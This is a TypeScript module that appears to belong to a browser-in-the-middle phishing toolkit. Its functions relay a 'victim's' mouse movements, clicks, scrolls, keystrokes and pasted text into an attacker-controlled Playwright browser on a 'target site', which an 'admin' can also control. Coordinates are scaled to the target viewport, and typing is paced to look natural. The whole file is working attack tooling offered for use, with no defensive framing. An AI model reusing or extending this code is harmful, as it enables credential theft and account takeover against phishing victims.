import type { BrowserInstance, MousePayload, MouseClickPayload, MouseScrollPayload, KeyPayload, PastePayload } from './types.js';

// ═══════════════════════════════════════════════════════════════════════════════
// Key Name Normalization
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Maps browser KeyboardEvent.key values to Playwright key names.
 * 
 * Browser and Playwright use slightly different key naming conventions.
 * This map ensures compatibility by translating browser keys to Playwright format.
 * 
 * Most printable characters (a-z, 0-9, etc.) are identical and don't need mapping.
 * Special keys (arrows, function keys, modifiers) require explicit mapping.
 */
const KEY_NAME_MAP: Record<string, string> = {
  ' ': 'Space',
  'ArrowUp': 'ArrowUp',
  'ArrowDown': 'ArrowDown',
  'ArrowLeft': 'ArrowLeft',
  'ArrowRight': 'ArrowRight',
  'Backspace': 'Backspace',
  'Delete': 'Delete',
  'Enter': 'Enter',
  'Tab': 'Tab',
  'Escape': 'Escape',
  'CapsLock': 'CapsLock',
  'Shift': 'Shift',
  'Control': 'Control',
  'Alt': 'Alt',
  'Meta': 'Meta',
  'Home': 'Home',
  'End': 'End',
  'PageUp': 'PageUp',
  'PageDown': 'PageDown',
  'Insert': 'Insert',
  'F1': 'F1', 'F2': 'F2', 'F3': 'F3', 'F4': 'F4',
  'F5': 'F5', 'F6': 'F6', 'F7': 'F7', 'F8': 'F8',
  'F9': 'F9', 'F10': 'F10', 'F11': 'F11', 'F12': 'F12',
};

/**
 * Normalizes a browser key name to Playwright format.
 * 
 * @param key - Key value from browser KeyboardEvent.key
 * @returns Playwright-compatible key name
 */
function normalizeKey(key: string): string {
  return KEY_NAME_MAP[key] ?? key;
}

// ═══════════════════════════════════════════════════════════════════════════════
// Coordinate Scaling
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Scales victim's screen coordinates to Playwright viewport coordinates.
 * 
 * **Why scaling is needed:**
 * - Victim's screen may be different size than target site's expected viewport
 * - Example: Victim has 1280x720 screen, target expects 1920x1080
 * - We need to translate victim's (100, 100) to target's (150, 150)
 * 
 * **Scale factors are computed at claim time:**
 * - scaleX = target.width / victimWidth
 * - scaleY = target.height / victimHeight
 * 
 * @param instance - Browser instance with scale factors
 * @param x - X coordinate in victim's viewport space
 * @param y - Y coordinate in victim's viewport space
 * @returns Scaled coordinates in Playwright viewport space
 */
function scaleCoords(
  instance: BrowserInstance,
  x: number,
  y: number,
): { x: number; y: number } {
  return {
    x: Math.round(x * instance.scaleX),
    y: Math.round(y * instance.scaleY),
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// Input Event Handlers
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Handles mouse movement events from victim or admin.
 * 
 * Translates victim's screen coordinates to Playwright viewport coordinates
 * and moves the mouse in the browser.
 * 
 * @param instance - Browser instance to control
 * @param data - Mouse position payload
 */
export async function handleMouseMove(
  instance: BrowserInstance,
  data: MousePayload,
): Promise<void> {
  try {
    const { x, y } = scaleCoords(instance, data.x, data.y);
    await instance.page.mouse.move(x, y);
  } catch {
    // Page may have closed between event arrival and handler execution
    // This is normal during navigation or session cleanup
  }
}

/**
 * Handles mouse click events from victim or admin.
 * 
 * Translates coordinates and performs a click at the specified position.
 * Supports left, right, and middle mouse buttons.
 * 
 * @param instance - Browser instance to control
 * @param data - Mouse click payload with position and button
 */
export async function handleMouseClick(
  instance: BrowserInstance,
  data: MouseClickPayload,
): Promise<void> {
  try {
    const { x, y } = scaleCoords(instance, data.x, data.y);
    await instance.page.mouse.click(x, y, {
      button: data.button,
    });
  } catch {
    // Ignore errors (page may have closed)
  }
}

/**
 * Handles mouse scroll events from victim or admin.
 * 
 * Performs a scroll operation and keeps the mouse positioned at the scroll point.
 * This ensures hover effects and tooltips work correctly after scrolling.
 * 
 * @param instance - Browser instance to control
 * @param data - Mouse scroll payload with position and deltas
 */
export async function handleMouseScroll(
  instance: BrowserInstance,
  data: MouseScrollPayload,
): Promise<void> {
  try {
    const { x, y } = scaleCoords(instance, data.x, data.y);
    // Perform scroll operation
    await instance.page.mouse.wheel(data.deltaX, data.deltaY);
    // Keep mouse positioned at scroll point for hover effects
    await instance.page.mouse.move(x, y);
  } catch {
    // Ignore errors (page may have closed)
  }
}

/**
 * Handles key down events from victim or admin.
 * 
 * Normalizes the key name and sends a key press to the browser.
 * Key down events are paired with key up events to simulate real typing.
 * 
 * @param instance - Browser instance to control
 * @param data - Key payload with key name and code
 */
export async function handleKeyDown(
  instance: BrowserInstance,
  data: KeyPayload,
): Promise<void> {
  try {
    await instance.page.keyboard.down(normalizeKey(data.key));
  } catch {
    // Ignore errors (page may have closed)
  }
}

/**
 * Handles key up events from victim or admin.
 * 
 * Normalizes the key name and sends a key release to the browser.
 * Paired with key down events to complete the keystroke.
 * 
 * @param instance - Browser instance to control
 * @param data - Key payload with key name and code
 */
export async function handleKeyUp(
  instance: BrowserInstance,
  data: KeyPayload,
): Promise<void> {
  try {
    await instance.page.keyboard.up(normalizeKey(data.key));
  } catch {
    // Ignore errors (page may have closed)
  }
}

/**
 * Handles paste events from victim or admin.
 * 
 * Types the pasted text character-by-character with a small delay.
 * The 150ms pause before typing ensures any preceding mouse click
 * has time to focus the target input field.
 * 
 * @param instance - Browser instance to control
 * @param data - Paste payload with text content
 */
export async function handlePaste(
  instance: BrowserInstance,
  data: PastePayload,
): Promise<void> {
  try {
    // Brief pause so any preceding mouse_click has time to focus the target field
    await new Promise((r) => setTimeout(r, 150));
    // Type with 20ms delay between characters for more natural appearance
    await instance.page.keyboard.type(data.text, { delay: 20 });
  } catch {
    // Ignore errors (page may have closed)
  }
}